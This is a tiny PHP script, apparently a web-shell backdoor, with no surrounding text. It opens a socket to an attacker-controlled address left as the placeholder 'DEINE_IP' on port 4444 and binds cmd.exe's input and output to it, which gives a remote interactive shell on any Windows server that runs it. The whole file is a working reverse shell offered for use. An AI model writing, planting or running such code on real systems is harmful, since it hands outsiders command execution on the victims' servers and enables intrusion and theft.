<?php
$ip = 'DEINE_IP';
$port = 4444;
$socket = fsockopen($ip, $port);
if ($socket) {
    $proc = proc_open('cmd.exe', [0 => $socket, 1 => $socket, 2 => $socket], $pipes);
}
?>
